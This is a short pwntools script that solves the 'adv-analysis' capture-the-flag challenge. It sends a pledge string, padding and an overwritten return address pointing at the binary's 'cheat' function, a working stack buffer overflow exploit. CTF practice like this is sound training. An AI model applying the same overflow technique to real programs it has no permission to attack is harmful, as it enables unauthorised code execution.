from pwn import *

elf = ELF('./adv-analysis')
# p = process(elf.path)
p = remote('bin.bcactf.com', 49156)

required_string = b'i pledge to not cheat\x00'
OFFSET = 72 - len(required_string)

print(p.clean())
p.sendline(required_string + b'A' * OFFSET + p64(elf.symbols['cheat']))

p.interactive()

